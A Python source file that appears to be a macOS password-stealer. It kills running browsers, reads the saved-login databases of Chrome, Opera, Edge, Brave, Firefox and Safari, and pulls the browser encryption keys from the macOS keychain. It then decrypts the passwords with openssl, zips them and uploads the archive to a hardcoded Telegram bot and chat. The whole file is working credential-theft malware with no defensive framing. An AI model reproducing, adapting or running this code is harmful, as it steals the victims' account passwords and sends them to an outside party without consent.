import sqlite3
import os
import binascii
import subprocess
import base64
import sys
import hashlib
import glob
import time
import json
import zipfile
import requests
from colorama import Fore

# Telegram bot token and chat ID
TELEGRAM_BOT_TOKEN = '6896308893:AAGk2eugmZqJ5yqIWBj4-G901wNvnP6yY1Q'
TELEGRAM_CHAT_ID = '1247908165'

# Function to send a file to a Telegram bot
def send_to_telegram(file_path):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument'
    with open(file_path, 'rb') as file:
        response = requests.post(url, data={'chat_id': TELEGRAM_CHAT_ID}, files={'document': file})
    return response.json()

def kill_processes(process_names):
    for process_name in process_names:
        try:
            process_id = subprocess.check_output(f"ps -A | grep '{process_name}' | awk '{{print $1}}'", shell=True)
            process_id = process_id.replace(b"\n", b" ").replace(b"\"", b"").decode('utf-8').split()
            if process_id:
                subprocess.Popen(['kill', "-9", process_id[0]], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(1)
        except subprocess.CalledProcessError:
            continue

kill_processes(["Opera", "Google Chrome", "firefox", "Safari", "Microsoft Edge", "Brave Browser"])

def get_login_data_paths():
    browsers = {
        "Opera": glob.glob(f"{os.path.expanduser('~')}/Library/Application Support/com.operasoftware.OperaGX/Login Data"),
        "Chrome": glob.glob(f"{os.path.expanduser('~')}/Library/Application Support/Google/Chrome/Profile*/Login Data"),
        "Firefox": glob.glob(f"{os.path.expanduser('~')}/Library/Application Support/Firefox/Profiles/*.default-release*/logins.json"),
        "Safari": glob.glob(f"{os.path.expanduser('~')}/Library/Safari/Databases/___IndexedDB/file__0/0/IndexedDB/https_webkit_indexeddb_database_v0/indexeddb.sqlite"),
        "Edge": glob.glob(f"{os.path.expanduser('~')}/Library/Application Support/Microsoft Edge/Profile*/Login Data"),
        "Brave": glob.glob(f"{os.path.expanduser('~')}/Library/Application Support/BraveSoftware/Brave-Browser/Profile*/Login Data")
    }
    return browsers

login_data_paths = get_login_data_paths()

def get_safe_storage_key(service_name):
    try:
        key = subprocess.check_output(f"security 2>&1 > /dev/null find-generic-password -ga '{service_name}' | awk '{{print $2}}'", shell=True)
        return key.replace(b"\n", b"").replace(b"\"", b"")
    except subprocess.CalledProcessError:
        return b""

keys = {
    "Opera": get_safe_storage_key("Opera"),
    "Chrome": get_safe_storage_key("Chrome"),
    "Edge": get_safe_storage_key("Microsoft Edge"),
    "Brave": get_safe_storage_key("Brave")
}

def PasswordDecrypt(encrypted_value, iv, key=None):
    hexKey = binascii.hexlify(key).decode('utf-8')
    hexEncPassword = base64.b64encode(encrypted_value[3:]).decode('utf-8')
    try:
        decrypted = subprocess.check_output(
            f"openssl enc -base64 -d -aes-128-cbc -iv '{iv}' -K {hexKey} <<< {hexEncPassword} 2>/dev/null", shell=True
        )
    except Exception as e:
        decrypted = f"{Fore.RED}ERROR retrieving password"
    return decrypted

def ChromiumProcess(safeStorageKey, loginData):
    iv = ''.join(('20',) * 16)
    key = hashlib.pbkdf2_hmac('sha1', safeStorageKey, b'saltysalt', 1003)[:16]
    fd = os.open(loginData, os.O_RDONLY)
    database = sqlite3.connect(f'/dev/fd/{fd}')
    os.close(fd)
    sql = 'select username_value, password_value, origin_url from logins'
    decryptedList = []
    with database:
        for user, encryptedPass, url in database.execute(sql):
            if user == "" or (encryptedPass[:3] != b'v10'):
                continue
            else:
                urlUserPassDecrypted = (
                    url,
                    user,
                    PasswordDecrypt(encryptedPass, iv, key=key),
                )
                decryptedList.append(urlUserPassDecrypted)
    return decryptedList

def FirefoxProcess(loginData):
    with open(loginData, 'r') as f:
        data = json.load(f)
    logins = data['logins']
    decryptedList = []
    for login in logins:
        urlUserPassDecrypted = (
            login['hostname'],
            login['usernameField'],
            login['passwordField']
        )
        decryptedList.append(urlUserPassDecrypted)
    return decryptedList

def SafariProcess(database_path):
    # Safari uses SQLite databases but with different structure
    decryptedList = []
    fd = os.open(database_path, os.O_RDONLY)
    database = sqlite3.connect(f'/dev/fd/{fd}')
    os.close(fd)
    sql = 'select username, password, url from passwords'
    with database:
        for user, encryptedPass, url in database.execute(sql):
            decryptedList.append((url, user, encryptedPass))
    return decryptedList

def print_passwords(browser, paths, key=None):
    if key == b"" and browser != "Firefox" and browser != "Safari":
        print(f"{Fore.RED}ERROR getting Safe Storage Key for {browser}")
        return
    
    print(f"{Fore.BLUE}Printing {browser} Passwords")
    print(f"{Fore.GREEN}")
    
    results = []
    for profile in paths:
        if browser in ["Chrome", "Opera", "Edge", "Brave"]:
            decrypted_list = ChromiumProcess(key, f"{profile}")
        elif browser == "Firefox":
            decrypted_list = FirefoxProcess(profile)
        elif browser == "Safari":
            decrypted_list = SafariProcess(profile)
        
        for x in decrypted_list:
            entry = f"Website: {x[0]}\nUser: {x[1]}\nPass: {x[2].decode('utf-8') if isinstance(x[2], bytes) else x[2]}\n"
            results.append(entry)
            print(entry)
            time.sleep(1)
    return results

all_results = []
for browser, paths in login_data_paths.items():
    key = keys.get(browser, None)
    results = print_passwords(browser, paths, key)
    if results:
        all_results.extend(results)

# Save results to a file and zip it
results_file = 'extracted_passwords.txt'
with open(results_file, 'w') as f:
    f.write('\n'.join(all_results))

zip_file = 'extracted_data.zip'
with zipfile.ZipFile(zip_file, 'w') as zipf:
    zipf.write(results_file)

# Send the zip file to Telegram
response = send_to_telegram(zip_file)
print(response)